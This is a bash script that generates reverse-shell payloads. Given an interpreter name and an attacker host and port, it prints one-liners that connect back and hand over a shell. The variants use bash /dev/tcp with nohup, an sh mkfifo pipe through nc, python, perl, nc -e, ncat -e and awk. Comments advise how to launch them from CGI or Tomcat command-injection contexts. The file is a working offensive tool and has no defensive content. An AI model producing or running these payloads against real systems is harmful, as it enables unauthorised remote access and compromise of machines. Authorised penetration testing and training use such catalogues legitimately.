#!/bin/bash
# shell-payloads: catalog of well-known reverse-shell payloads, one per
# (interpreter, channel) tuple. Pure data — no LLM involvement. Sourced
# from PayloadsAllTheThings.
#
# Usage:
#   shell-payloads <interpreter> <channel> --lhost X --lport Y
#   shell-payloads --list                  # list supported (interp, channel) pairs
#
# Channels:
#   tcp_raw      raw TCP, attacker has socat/nc listener
#
# Interpreters (in priority order):
#   bash python python3 perl nc ncat awk curl

set -u

LHOST="" LPORT=""
INTERP="" CHANNEL=""
LIST=0

while [ $# -gt 0 ]; do
  case "$1" in
    --lhost)   LHOST="$2"; shift ;;
    --lport)   LPORT="$2"; shift ;;
    --list)    LIST=1 ;;
    --help|-h) sed -n '2,15p' "$0"; exit 0 ;;
    -*)        echo "unknown flag: $1" >&2; exit 2 ;;
    *)
      if   [ -z "$INTERP" ];  then INTERP="$1"
      elif [ -z "$CHANNEL" ]; then CHANNEL="$1"
      else echo "extra arg: $1" >&2; exit 2
      fi ;;
  esac
  shift
done

if [ "$LIST" -eq 1 ]; then
  cat <<'EOF'
bash       tcp_raw
sh         tcp_raw
python3    tcp_raw
python     tcp_raw
perl       tcp_raw
nc         tcp_raw
ncat       tcp_raw
awk        tcp_raw
EOF
  exit 0
fi

if [ -z "$INTERP" ] || [ -z "$CHANNEL" ]; then
  echo "usage: shell-payloads <interpreter> <channel> --lhost X --lport Y" >&2
  exit 2
fi

if [ "$CHANNEL" != "tcp_raw" ]; then
  echo "channel '$CHANNEL' not yet supported (only tcp_raw)" >&2
  exit 2
fi

if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
  echo "tcp_raw requires --lhost and --lport" >&2
  exit 2
fi

case "$INTERP" in
  bash)
    # /dev/tcp is bash-only. Wrap in nohup+background so CGI-context
    # exploits (Apache mod_cgi, Tomcat command-context) can launch it
    # without the parent killing the child when it returns.
    printf 'nohup bash -c "bash -i >& /dev/tcp/%s/%s 0>&1" &' "$LHOST" "$LPORT" ;;

  sh)
    # POSIX sh: use mkfifo trick (no /dev/tcp). Requires nc OR similar.
    # Many alpine/busybox boxes have only sh — prefer falling through to nc.
    printf 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f' "$LHOST" "$LPORT" ;;

  python3|python)
    printf 'python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"%s\\",%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\"/bin/sh\\")"' "$LHOST" "$LPORT" ;;

  perl)
    printf 'perl -e "use Socket;\$i=\\"%s\\";\$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");};"' "$LHOST" "$LPORT" ;;

  nc)
    # GNU netcat with -e
    printf 'nc -e /bin/sh %s %s' "$LHOST" "$LPORT" ;;

  ncat)
    printf 'ncat -e /bin/sh %s %s' "$LHOST" "$LPORT" ;;

  awk)
    printf 'awk "BEGIN {s=\\"/inet/tcp/0/%s/%s\\"; while(42) { do{ printf \\"shell>\\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \\"exit\\") close(s); }}" /dev/null' "$LHOST" "$LPORT" ;;

  *)
    echo "no payload for interpreter '$INTERP' on channel '$CHANNEL'" >&2
    exit 2 ;;
esac
echo
